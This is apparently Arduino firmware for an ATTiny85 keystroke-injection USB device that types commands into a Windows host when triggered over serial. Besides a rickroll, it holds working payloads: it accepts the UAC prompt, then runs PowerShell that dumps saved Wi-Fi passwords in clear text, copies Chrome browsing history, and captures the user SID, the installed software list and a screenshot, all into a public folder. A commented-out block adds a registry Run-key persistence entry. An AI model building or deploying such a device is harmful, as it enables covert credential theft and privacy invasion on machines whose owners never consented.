// Code to be flashed in the ATTiny85. Upon startup it waits on commands to be sent as an ascii character on the P2 pin using UART Software Serialization

#include <SoftSerial_INT0.h>
#include "DigiKeyboard.h"

#define LED_PIN PB1

SoftSerial mySerial(2, -1); // RX, TX

void setup() {
  mySerial.begin(9600);
  pinMode(LED_PIN, OUTPUT);
  DigiKeyboard.sendKeyStroke(0);  // Initialize DigiKeyboard
  DigiKeyboard.delay(2000);
}

void loop() {
  digitalWrite(LED_PIN, HIGH);
  if (mySerial.available() > 0) {
    digitalWrite(LED_PIN, LOW);  // LED ON
    char cmd = mySerial.read();
    if (cmd == 'r'){ // R for rickroll
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(600);
      DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(5000);
      digitalWrite(LED_PIN, LOW);
    // } else if (cmd == 'c') { // C for Crazy Frog
    //   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    //   DigiKeyboard.delay(600);
    //   DigiKeyboard.print("https://www.youtube.com/watch?v=k85mRPqvMbE&t=7s");
    //   DigiKeyboard.sendKeyStroke(KEY_ENTER);
    //   DigiKeyboard.delay(5000);
    //   digitalWrite(LED_PIN, LOW);
    }
    else if (cmd == 'w') { // WIFI data extraction
      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_A);
      DigiKeyboard.delay(1000);

      // Bypass UAC: Alt+Y
      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
      DigiKeyboard.delay(500);

      // Run PowerShell to extract Wi-Fi creds and save to CSV
      DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path C:\\Users\\Public\\wifi.csv -NoTypeInformation;exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(2000);

      // Open the file in Notepad
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("notepad C:\\Users\\Public\\wifi.csv");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(1000);
    } else if (cmd == 'b') { // Browser history extraction!
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("powershell");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(800);

      DigiKeyboard.print(F("$historyPath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\";"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(300);
      DigiKeyboard.print(F("Copy-Item $historyPath -Destination \"C:\\Users\\Public\\chrome_history.db\" -Force"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(300);
      DigiKeyboard.print(F("exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
    } else if (cmd == 'h') { // hashes extraction (Current User)
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("cmd");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(800);

      DigiKeyboard.print(F("whoami /user > C:\\Users\\Public\\user_sid.txt"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("exit");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
    } else if (cmd == 'i') { // Installed software extraction!
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("powershell");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(800);

      DigiKeyboard.print(F("Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion > \"C:\\Users\\Public\\installed_programs.txt\""));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("exit");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
    // } else if (cmd == 's') { // Adding calculator as a startup application
    //   DigiKeyboard.delay(500);
      // DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Open the Start Menu
      // DigiKeyboard.delay(500);
      // DigiKeyboard.sendKeyStroke(KEY_R); // Open "Run" dialog
      // DigiKeyboard.delay(500);
      // DigiKeyboard.print(F("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Calculator\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f"));
      // DigiKeyboard.sendKeyStroke(KEY_ENTER); // Run the command
      // DigiKeyboard.delay(500);
    } 
    else if (cmd == 's') { // Screenshot of the current window and saving
      delay(500);

      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R
      delay(500);
      DigiKeyboard.print("powershell");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      delay(2000);

      // PowerShell commands to take a screenshot
      DigiKeyboard.print(F("Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;$g=[Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);$bmp.Save(\"C:\\Users\\Public\\screenshot.png\",[Drawing.Imaging.ImageFormat]::Png);"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
    }
  }
}
